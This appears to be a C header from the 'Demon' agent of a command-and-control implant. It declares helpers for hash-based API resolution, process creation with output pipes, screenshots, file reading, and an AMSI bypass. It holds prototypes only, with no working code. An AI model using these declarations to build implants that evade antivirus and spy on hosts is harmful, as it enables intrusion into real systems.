#ifndef DEMON_WINUTILS_H
#define DEMON_WINUTILS_H

#include <windows.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <mscoree.h>
#include <shellapi.h>
#include <winhttp.h>

#include <Common/Macros.h>
#include <Common/Native.h>

#include <Core/Syscalls.h>

#include <iphlpapi.h>
#include <lm.h>

typedef struct
{
    PVOID TebInformation;
    ULONG TebOffset;
    ULONG BytesToRead;
} THREAD_TEB_INFORMATION;

typedef struct _BUFFER
{
    PVOID  Buffer;
    UINT32 Length;
} BUFFER, *PBUFFER;

typedef struct _ANONPIPE
{
    HANDLE StdOutRead;
    HANDLE StdOutWrite;
} ANONPIPE, *PANONPIPE;

#define HASH_KEY 5381
#define WIN_FUNC(x) __typeof__(x) * x;

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

#define PIPE_BUFFER_MAX 0x10000 - 1
#define MAX( a, b ) ( ( a ) > ( b ) ? ( a ) : ( b ) )
#define MIN( a, b ) ( ( a ) < ( b ) ? ( a ) : ( b ) )

DWORD HashStringA(
    IN PCHAR String
);

ULONG HashEx(
    IN PVOID String,
    IN ULONG Length,
    IN BOOL  Upper
);

PVOID LdrFunctionAddr(
    IN PVOID Module,
    IN ULONG   Hash
);

PVOID LdrModulePeb(
    IN DWORD hash
);

PVOID LdrModuleLoad(
    IN LPSTR ModuleName
);

BOOL ProcessCreate(
    IN  BOOL                 x86,
    IN  LPWSTR               App,
    IN  LPWSTR               CmdLine,
    IN  DWORD                Flags,
    OUT PROCESS_INFORMATION* ProcessInfo,
    IN  BOOL                 Piped,
    IN  PANONPIPE            AnonPipes
);

BOOL ProcessIsWow(
    IN HANDLE hProcess
);

HANDLE ProcessOpen(
    IN DWORD Pid,
    IN DWORD Access
);

NTSTATUS ProcessSnapShot(
    OUT PSYSTEM_PROCESS_INFORMATION* Buffer,
    OUT PSIZE_T Size
);

BOOL ReadLocalFile(
    IN  LPCWSTR FileName,
    OUT PVOID*  FileContent,
    OUT PDWORD  FileSize
);

BOOL WinScreenshot(
    OUT PVOID*  ImagePointer,
    OUT PSIZE_T ImageSize
);

BOOL AnonPipesInit(
    OUT PANONPIPE AnonPipes
);

VOID AnonPipesRead(
    IN PANONPIPE AnonPipes,
    IN UINT32    RequestID
);

BOOL PipeWrite(
    IN HANDLE Handle,
    IN PBUFFER Buffer
);

BOOL PipeRead(
    IN  HANDLE Handle,
    OUT PBUFFER Buffer
);

BOOL CfgQueryEnforced(
    VOID
);

VOID CfgAddressAdd(
    IN PVOID ImageBase,
    IN PVOID Function
);

BOOL EventSet(
    IN HANDLE Event
);

BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
);

BOOL BypassPatchAMSI(
    VOID
);

ULONG RandomNumber32(
    VOID
);

BOOL RandomBool(
    VOID
);


#endif
